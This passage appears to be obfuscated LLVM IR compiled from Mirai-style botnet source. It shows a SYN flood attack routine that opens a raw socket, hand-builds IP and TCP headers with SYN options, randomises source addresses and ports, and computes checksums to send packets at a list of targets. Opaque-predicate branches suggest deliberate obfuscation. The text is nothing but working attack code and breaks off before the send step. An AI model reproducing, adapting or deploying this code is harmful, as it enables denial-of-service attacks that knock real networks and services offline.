  %25 = alloca i8, align 1
  %26 = alloca i8, align 1
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca %struct.iphdr*, align 8
  %31 = alloca %struct.tcphdr*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca i8*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %37 = load i8, i8* %7, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 %38, i64 8) #6
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %13, align 8
  %41 = load i8, i8* %9, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 2, i32 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %14, align 1
  %45 = load i8, i8* %9, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 3, i32 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %15, align 2
  %49 = load i8, i8* %9, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 4, i32 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %16, align 1
  %53 = load i8, i8* %9, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 5, i32 1)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %17, align 1
  %57 = load i8, i8* %9, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 6, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %18, align 2
  %61 = load i8, i8* %9, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 7, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %19, align 2
  %65 = load i8, i8* %9, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 16, i32 65535)
  store i32 %67, i32* %20, align 4
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 17, i32 0)
  store i32 %70, i32* %21, align 4
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 10, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %22, align 1
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 11, i32 0)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %23, align 1
  %79 = load i8, i8* %9, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 12, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %24, align 1
  %83 = load i8, i8* %9, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 13, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %25, align 1
  %87 = load i8, i8* %9, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 14, i32 1)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %26, align 1
  %91 = load i8, i8* %9, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 15, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %27, align 1
  %95 = load i8, i8* %9, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %97 = load i32, i32* @LOCAL_ADDR, align 4
  %98 = call i32 @attack_get_opt_ip(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 19, i32 %97)
  store i32 %98, i32* %28, align 4
  %99 = call i64 @time(i64* null) #6
  %100 = load i32, i32* %6, align 4
  %101 = sext i32 %100 to i64
  %102 = add nsw i64 %99, %101
  %103 = trunc i64 %102 to i32
  store i32 %103, i32* %29, align 4
  %104 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %104, i32* %12, align 4
  %105 = icmp eq i32 %104, -1
  br i1 %105, label %106, label %107

; <label>:106:                                    ; preds = %5
  br label %547

; <label>:107:                                    ; preds = %5
  store i32 1, i32* %11, align 4
  %108 = load i32, i32* %12, align 4
  %109 = bitcast i32* %11 to i8*
  %110 = call i32 @setsockopt(i32 %108, i32 0, i32 3, i8* %109, i32 4) #6
  %111 = icmp eq i32 %110, -1
  br i1 %111, label %112, label %115

; <label>:112:                                    ; preds = %107
  %113 = load i32, i32* %12, align 4
  %114 = call i32 @close(i32 %113)
  br label %547

; <label>:115:                                    ; preds = %107
  store i32 0, i32* %11, align 4
  br label %116

; <label>:116:                                    ; preds = %309, %115
  %117 = load i32, i32* %11, align 4
  %118 = load i8, i8* %7, align 1
  %119 = zext i8 %118 to i32
  %120 = icmp slt i32 %117, %119
  br i1 %120, label %121, label %312

; <label>:121:                                    ; preds = %116
  %122 = call noalias i8* @calloc(i64 128, i64 1) #6
  %123 = load i8**, i8*** %13, align 8
  %124 = load i32, i32* %11, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds i8*, i8** %123, i64 %125
  store i8* %122, i8** %126, align 8
  %127 = load i8**, i8*** %13, align 8
  %128 = load i32, i32* %11, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds i8*, i8** %127, i64 %129
  %131 = load i8*, i8** %130, align 8
  %132 = bitcast i8* %131 to %struct.iphdr*
  store %struct.iphdr* %132, %struct.iphdr** %30, align 8
  %133 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %134 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %133, i64 1
  %135 = bitcast %struct.iphdr* %134 to %struct.tcphdr*
  store %struct.tcphdr* %135, %struct.tcphdr** %31, align 8
  %136 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %137 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %136, i64 1
  %138 = bitcast %struct.tcphdr* %137 to i8*
  store i8* %138, i8** %32, align 8
  %139 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %140 = bitcast %struct.iphdr* %139 to i8*
  %141 = load i8, i8* %140, align 4
  %142 = and i8 %141, 15
  %143 = or i8 %142, 64
  store i8 %143, i8* %140, align 4
  %144 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %145 = bitcast %struct.iphdr* %144 to i8*
  %146 = load i8, i8* %145, align 4
  %147 = and i8 %146, -16
  %148 = or i8 %147, 5
  store i8 %148, i8* %145, align 4
  %149 = load i8, i8* %14, align 1
  %150 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %151 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %150, i32 0, i32 1
  store i8 %149, i8* %151, align 1
  %152 = call zeroext i16 @htons(i16 zeroext 60) #7
  %153 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i32 0, i32 2
  store i16 %152, i16* %154, align 2
  %155 = load i16, i16* %15, align 2
  %156 = call zeroext i16 @htons(i16 zeroext %155) #7
  %157 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %158 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %157, i32 0, i32 3
  store i16 %156, i16* %158, align 4
  %159 = load i8, i8* %16, align 1
  %160 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %161 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %160, i32 0, i32 5
  store i8 %159, i8* %161, align 4
  %162 = load i8, i8* %17, align 1
  %163 = icmp ne i8 %162, 0
  br i1 %163, label %164, label %168

; <label>:164:                                    ; preds = %121
  %165 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %166 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 4
  store i16 %165, i16* %167, align 2
  br label %168

; <label>:168:                                    ; preds = %164, %121
  %169 = load i32, i32* @x.21
  %170 = load i32, i32* @y.22
  %171 = sub i32 %169, 1
  %172 = mul i32 %169, %171
  %173 = urem i32 %172, 2
  %174 = icmp eq i32 %173, 0
  %175 = icmp slt i32 %170, 10
  %176 = or i1 %174, %175
  br i1 %176, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %168
  %177 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 6
  store i8 6, i8* %178, align 1
  %179 = load i32, i32* %28, align 4
  %180 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %181 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %180, i32 0, i32 8
  store i32 %179, i32* %181, align 4
  %182 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %183 = load i32, i32* %11, align 4
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %182, i64 %184
  %186 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %185, i32 0, i32 1
  %187 = load i32, i32* %186, align 4
  %188 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %189 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %188, i32 0, i32 9
  store i32 %187, i32* %189, align 4
  %190 = load i16, i16* %18, align 2
  %191 = call zeroext i16 @htons(i16 zeroext %190) #7
  %192 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %193 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %192, i32 0, i32 0
  store i16 %191, i16* %193, align 4
  %194 = load i16, i16* %19, align 2
  %195 = call zeroext i16 @htons(i16 zeroext %194) #7
  %196 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %197 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %196, i32 0, i32 1
  store i16 %195, i16* %197, align 2
  %198 = load i32, i32* %20, align 4
  %199 = trunc i32 %198 to i16
  %200 = call zeroext i16 @htons(i16 zeroext %199) #7
  %201 = zext i16 %200 to i32
  %202 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %203 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %202, i32 0, i32 2
  store i32 %201, i32* %203, align 4
  %204 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %205 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %204, i32 0, i32 4
  %206 = load i16, i16* %205, align 4
  %207 = and i16 %206, -241
  %208 = or i16 %207, 160
  store i16 %208, i16* %205, align 4
  %209 = load i8, i8* %22, align 1
  %210 = sext i8 %209 to i16
  %211 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %212 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %211, i32 0, i32 4
  %213 = load i16, i16* %212, align 4
  %214 = and i16 %210, 1
  %215 = shl i16 %214, 13
  %216 = and i16 %213, -8193
  %217 = or i16 %216, %215
  store i16 %217, i16* %212, align 4
  %218 = load i8, i8* %23, align 1
  %219 = sext i8 %218 to i16
  %220 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %221 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %220, i32 0, i32 4
  %222 = load i16, i16* %221, align 4
  %223 = and i16 %219, 1
  %224 = shl i16 %223, 12
  %225 = and i16 %222, -4097
  %226 = or i16 %225, %224
  store i16 %226, i16* %221, align 4
  %227 = load i8, i8* %24, align 1
  %228 = sext i8 %227 to i16
  %229 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %230 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %229, i32 0, i32 4
  %231 = load i16, i16* %230, align 4
  %232 = and i16 %228, 1
  %233 = shl i16 %232, 11
  %234 = and i16 %231, -2049
  %235 = or i16 %234, %233
  store i16 %235, i16* %230, align 4
  %236 = load i8, i8* %25, align 1
  %237 = sext i8 %236 to i16
  %238 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %239 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %238, i32 0, i32 4
  %240 = load i16, i16* %239, align 4
  %241 = and i16 %237, 1
  %242 = shl i16 %241, 10
  %243 = and i16 %240, -1025
  %244 = or i16 %243, %242
  store i16 %244, i16* %239, align 4
  %245 = load i8, i8* %26, align 1
  %246 = sext i8 %245 to i16
  %247 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %248 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %247, i32 0, i32 4
  %249 = load i16, i16* %248, align 4
  %250 = and i16 %246, 1
  %251 = shl i16 %250, 9
  %252 = and i16 %249, -513
  %253 = or i16 %252, %251
  store i16 %253, i16* %248, align 4
  %254 = load i8, i8* %27, align 1
  %255 = sext i8 %254 to i16
  %256 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %257 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %256, i32 0, i32 4
  %258 = load i16, i16* %257, align 4
  %259 = and i16 %255, 1
  %260 = shl i16 %259, 8
  %261 = and i16 %258, -257
  %262 = or i16 %261, %260
  store i16 %262, i16* %257, align 4
  %263 = load i8*, i8** %32, align 8
  %264 = getelementptr inbounds i8, i8* %263, i32 1
  store i8* %264, i8** %32, align 8
  store i8 2, i8* %263, align 1
  %265 = load i8*, i8** %32, align 8
  %266 = getelementptr inbounds i8, i8* %265, i32 1
  store i8* %266, i8** %32, align 8
  store i8 4, i8* %265, align 1
  %267 = call i32 @rand_next()
  %268 = and i32 %267, 15
  %269 = add i32 1400, %268
  %270 = trunc i32 %269 to i16
  %271 = call zeroext i16 @htons(i16 zeroext %270) #7
  %272 = load i8*, i8** %32, align 8
  %273 = bitcast i8* %272 to i16*
  store i16 %271, i16* %273, align 2
  %274 = load i8*, i8** %32, align 8
  %275 = getelementptr inbounds i8, i8* %274, i64 2
  store i8* %275, i8** %32, align 8
  %276 = load i8*, i8** %32, align 8
  %277 = getelementptr inbounds i8, i8* %276, i32 1
  store i8* %277, i8** %32, align 8
  store i8 4, i8* %276, align 1
  %278 = load i8*, i8** %32, align 8
  %279 = getelementptr inbounds i8, i8* %278, i32 1
  store i8* %279, i8** %32, align 8
  store i8 2, i8* %278, align 1
  %280 = load i8*, i8** %32, align 8
  %281 = getelementptr inbounds i8, i8* %280, i32 1
  store i8* %281, i8** %32, align 8
  store i8 8, i8* %280, align 1
  %282 = load i8*, i8** %32, align 8
  %283 = getelementptr inbounds i8, i8* %282, i32 1
  store i8* %283, i8** %32, align 8
  store i8 10, i8* %282, align 1
  %284 = call i32 @rand_next()
  %285 = load i8*, i8** %32, align 8
  %286 = bitcast i8* %285 to i32*
  store i32 %284, i32* %286, align 4
  %287 = load i8*, i8** %32, align 8
  %288 = getelementptr inbounds i8, i8* %287, i64 4
  store i8* %288, i8** %32, align 8
  %289 = load i8*, i8** %32, align 8
  %290 = bitcast i8* %289 to i32*
  store i32 0, i32* %290, align 4
  %291 = load i8*, i8** %32, align 8
  %292 = getelementptr inbounds i8, i8* %291, i64 4
  store i8* %292, i8** %32, align 8
  %293 = load i8*, i8** %32, align 8
  %294 = getelementptr inbounds i8, i8* %293, i32 1
  store i8* %294, i8** %32, align 8
  store i8 1, i8* %293, align 1
  %295 = load i8*, i8** %32, align 8
  %296 = getelementptr inbounds i8, i8* %295, i32 1
  store i8* %296, i8** %32, align 8
  store i8 3, i8* %295, align 1
  %297 = load i8*, i8** %32, align 8
  %298 = getelementptr inbounds i8, i8* %297, i32 1
  store i8* %298, i8** %32, align 8
  store i8 3, i8* %297, align 1
  %299 = load i8*, i8** %32, align 8
  %300 = getelementptr inbounds i8, i8* %299, i32 1
  store i8* %300, i8** %32, align 8
  store i8 6, i8* %299, align 1
  %301 = load i32, i32* @x.21
  %302 = load i32, i32* @y.22
  %303 = sub i32 %301, 1
  %304 = mul i32 %301, %303
  %305 = urem i32 %304, 2
  %306 = icmp eq i32 %305, 0
  %307 = icmp slt i32 %302, 10
  %308 = or i1 %306, %307
  br i1 %308, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %309

; <label>:309:                                    ; preds = %originalBBpart2
  %310 = load i32, i32* %11, align 4
  %311 = add nsw i32 %310, 1
  store i32 %311, i32* %11, align 4
  br label %116

; <label>:312:                                    ; preds = %116
  br label %313

; <label>:313:                                    ; preds = %originalBBpart2201, %312
  store i32 0, i32* %11, align 4
  br label %314

; <label>:314:                                    ; preds = %521, %313
  %315 = load i32, i32* %11, align 4
  %316 = load i8, i8* %7, align 1
  %317 = zext i8 %316 to i32
  %318 = icmp slt i32 %315, %317
  br i1 %318, label %319, label %524

; <label>:319:                                    ; preds = %314
  %320 = load i32, i32* @x.21
  %321 = load i32, i32* @y.22
  %322 = sub i32 %320, 1
  %323 = mul i32 %320, %322
  %324 = urem i32 %323, 2
  %325 = icmp eq i32 %324, 0
  %326 = icmp slt i32 %321, 10
  %327 = or i1 %325, %326
  br i1 %327, label %originalBB167, label %originalBB167alteredBB

originalBB167:                                    ; preds = %originalBB167alteredBB, %319
  %328 = load i8**, i8*** %13, align 8
  %329 = load i32, i32* %11, align 4
  %330 = sext i32 %329 to i64
  %331 = getelementptr inbounds i8*, i8** %328, i64 %330
  %332 = load i8*, i8** %331, align 8
  store i8* %332, i8** %33, align 8
  %333 = load i8*, i8** %33, align 8
  %334 = bitcast i8* %333 to %struct.iphdr*
  store %struct.iphdr* %334, %struct.iphdr** %34, align 8
  %335 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %336 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %335, i64 1
  %337 = bitcast %struct.iphdr* %336 to %struct.tcphdr*
  store %struct.tcphdr* %337, %struct.tcphdr** %35, align 8
  %338 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %339 = load i32, i32* %11, align 4
  %340 = sext i32 %339 to i64
  %341 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %338, i64 %340
  %342 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %341, i32 0, i32 2
  %343 = load i8, i8* %342, align 4
  %344 = zext i8 %343 to i32
  %345 = icmp slt i32 %344, 32
  %346 = load i32, i32* @x.21
  %347 = load i32, i32* @y.22
  %348 = sub i32 %346, 1
  %349 = mul i32 %346, %348
  %350 = urem i32 %349, 2
  %351 = icmp eq i32 %350, 0
  %352 = icmp slt i32 %347, 10
  %353 = or i1 %351, %352
  br i1 %353, label %originalBBpart2169, label %originalBB167alteredBB

originalBBpart2169:                               ; preds = %originalBB167
  br i1 %345, label %354, label %375

; <label>:354:                                    ; preds = %originalBBpart2169
  %355 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %356 = load i32, i32* %11, align 4
  %357 = sext i32 %356 to i64
  %358 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %355, i64 %357
  %359 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %358, i32 0, i32 1
  %360 = load i32, i32* %359, align 4
  %361 = call i32 @ntohl(i32 %360) #7
  %362 = call i32 @rand_next()
  %363 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %364 = load i32, i32* %11, align 4
  %365 = sext i32 %364 to i64
  %366 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %363, i64 %365
  %367 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %366, i32 0, i32 2
  %368 = load i8, i8* %367, align 4
  %369 = zext i8 %368 to i32
  %370 = lshr i32 %362, %369
  %371 = add i32 %361, %370
  %372 = call i32 @htonl(i32 %371) #7
  %373 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %374 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %373, i32 0, i32 9
  store i32 %372, i32* %374, align 4
  br label %375

; <label>:375:                                    ; preds = %354, %originalBBpart2169
  %376 = load i32, i32* %28, align 4
  %377 = icmp eq i32 %376, -1
  br i1 %377, label %378, label %382

; <label>:378:                                    ; preds = %375
  %379 = call i32 @rand_next()
  %380 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %381 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %380, i32 0, i32 8
  store i32 %379, i32* %381, align 4
  br label %382

; <label>:382:                                    ; preds = %378, %375
  %383 = load i16, i16* %15, align 2
  %384 = zext i16 %383 to i32
  %385 = icmp eq i32 %384, 65535
  br i1 %385, label %386, label %408

; <label>:386:                                    ; preds = %382
  %387 = load i32, i32* @x.21
  %388 = load i32, i32* @y.22
  %389 = sub i32 %387, 1
  %390 = mul i32 %387, %389
  %391 = urem i32 %390, 2
  %392 = icmp eq i32 %391, 0
  %393 = icmp slt i32 %388, 10
  %394 = or i1 %392, %393
  br i1 %394, label %originalBB171, label %originalBB171alteredBB

originalBB171:                                    ; preds = %originalBB171alteredBB, %386
  %395 = call i32 @rand_next()
  %396 = and i32 %395, 65535
  %397 = trunc i32 %396 to i16
  %398 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %399 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %398, i32 0, i32 3
  store i16 %397, i16* %399, align 4
  %400 = load i32, i32* @x.21
  %401 = load i32, i32* @y.22
  %402 = sub i32 %400, 1
  %403 = mul i32 %400, %402
  %404 = urem i32 %403, 2
  %405 = icmp eq i32 %404, 0
  %406 = icmp slt i32 %401, 10
  %407 = or i1 %405, %406
  br i1 %407, label %originalBBpart2179, label %originalBB171alteredBB

originalBBpart2179:                               ; preds = %originalBB171
  br label %408

; <label>:408:                                    ; preds = %originalBBpart2179, %382
  %409 = load i16, i16* %18, align 2
  %410 = zext i16 %409 to i32
  %411 = icmp eq i32 %410, 65535
  br i1 %411, label %412, label %418

; <label>:412:                                    ; preds = %408
  %413 = call i32 @rand_next()
  %414 = and i32 %413, 65535
  %415 = trunc i32 %414 to i16
  %416 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %417 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %416, i32 0, i32 0
  store i16 %415, i16* %417, align 4
  br label %418

; <label>:418:                                    ; preds = %412, %408
  %419 = load i16, i16* %19, align 2
  %420 = zext i16 %419 to i32
  %421 = icmp eq i32 %420, 65535
  br i1 %421, label %422, label %444

; <label>:422:                                    ; preds = %418
  %423 = load i32, i32* @x.21
  %424 = load i32, i32* @y.22
  %425 = sub i32 %423, 1
  %426 = mul i32 %423, %425
  %427 = urem i32 %426, 2
  %428 = icmp eq i32 %427, 0
  %429 = icmp slt i32 %424, 10
  %430 = or i1 %428, %429
  br i1 %430, label %originalBB181, label %originalBB181alteredBB

originalBB181:                                    ; preds = %originalBB181alteredBB, %422
  %431 = call i32 @rand_next()
  %432 = and i32 %431, 65535
  %433 = trunc i32 %432 to i16
  %434 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %435 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %434, i32 0, i32 1
  store i16 %433, i16* %435, align 2
  %436 = load i32, i32* @x.21
  %437 = load i32, i32* @y.22
  %438 = sub i32 %436, 1
  %439 = mul i32 %436, %438
  %440 = urem i32 %439, 2
  %441 = icmp eq i32 %440, 0
  %442 = icmp slt i32 %437, 10
  %443 = or i1 %441, %442
  br i1 %443, label %originalBBpart2193, label %originalBB181alteredBB

originalBBpart2193:                               ; preds = %originalBB181
  br label %444

; <label>:444:                                    ; preds = %originalBBpart2193, %418
  %445 = load i32, i32* %20, align 4
  %446 = icmp eq i32 %445, 65535
  br i1 %446, label %447, label %451

; <label>:447:                                    ; preds = %444
  %448 = call i32 @rand_next()
  %449 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %450 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %449, i32 0, i32 2
  store i32 %448, i32* %450, align 4
  br label %451

; <label>:451:                                    ; preds = %447, %444
  %452 = load i32, i32* %21, align 4
  %453 = icmp eq i32 %452, 65535
  br i1 %453, label %454, label %458

; <label>:454:                                    ; preds = %451
  %455 = call i32 @rand_next()
  %456 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %457 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %456, i32 0, i32 3
  store i32 %455, i32* %457, align 4
  br label %458

; <label>:458:                                    ; preds = %454, %451
  %459 = load i32, i32* @x.21
  %460 = load i32, i32* @y.22
  %461 = sub i32 %459, 1
  %462 = mul i32 %459, %461
  %463 = urem i32 %462, 2
  %464 = icmp eq i32 %463, 0
  %465 = icmp slt i32 %460, 10
  %466 = or i1 %464, %465
  br i1 %466, label %originalBB195, label %originalBB195alteredBB

originalBB195:                                    ; preds = %originalBB195alteredBB, %458
  %467 = load i8, i8* %22, align 1
  %468 = icmp ne i8 %467, 0
  %469 = load i32, i32* @x.21
  %470 = load i32, i32* @y.22
  %471 = sub i32 %469, 1
  %472 = mul i32 %469, %471
  %473 = urem i32 %472, 2
  %474 = icmp eq i32 %473, 0
  %475 = icmp slt i32 %470, 10
  %476 = or i1 %474, %475
  br i1 %476, label %originalBBpart2197, label %originalBB195alteredBB

originalBBpart2197:                               ; preds = %originalBB195
  br i1 %468, label %477, label %483

; <label>:477:                                    ; preds = %originalBBpart2197
  %478 = call i32 @rand_next()
  %479 = and i32 %478, 65535
  %480 = trunc i32 %479 to i16
  %481 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %482 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %481, i32 0, i32 7
  store i16 %480, i16* %482, align 2
  br label %483

; <label>:483:                                    ; preds = %477, %originalBBpart2197
  %484 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %485 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %484, i32 0, i32 7
  store i16 0, i16* %485, align 2
  %486 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %487 = bitcast %struct.iphdr* %486 to i16*
  %488 = call zeroext i16 @checksum_generic(i16* %487, i32 20)
  %489 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %490 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %489, i32 0, i32 7
  store i16 %488, i16* %490, align 2
  %491 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %492 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %491, i32 0, i32 6
  store i16 0, i16* %492, align 4
  %493 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %494 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %495 = bitcast %struct.tcphdr* %494 to i8*
  %496 = call zeroext i16 @htons(i16 zeroext 40) #7
  %497 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %493, i8* %495, i16 zeroext %496, i32 40)
  %498 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %499 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %498, i32 0, i32 6
  store i16 %497, i16* %499, align 4
  %500 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %501 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %500, i32 0, i32 1
  %502 = load i16, i16* %501, align 2
  %503 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %504 = load i32, i32* %11, align 4
  %505 = sext i32 %504 to i64
  %506 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %503, i64 %505
  %507 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %506, i32 0, i32 0
  %508 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %507, i32 0, i32 1
  store i16 %502, i16* %508, align 2
  %509 = load i32, i32* %12, align 4
  %510 = load i8*, i8** %33, align 8
  %511 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %512 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %513 = load i32, i32* %11, align 4
  %514 = sext i32 %513 to i64
  %515 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %512, i64 %514
  %516 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %515, i32 0, i32 0
  %517 = bitcast %struct.sockaddr_in* %516 to %struct.sockaddr*
  store %struct.sockaddr* %517, %struct.sockaddr** %511, align 8
  %518 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %519 = load %struct.sockaddr*, %struct.sockaddr** %518, align 8
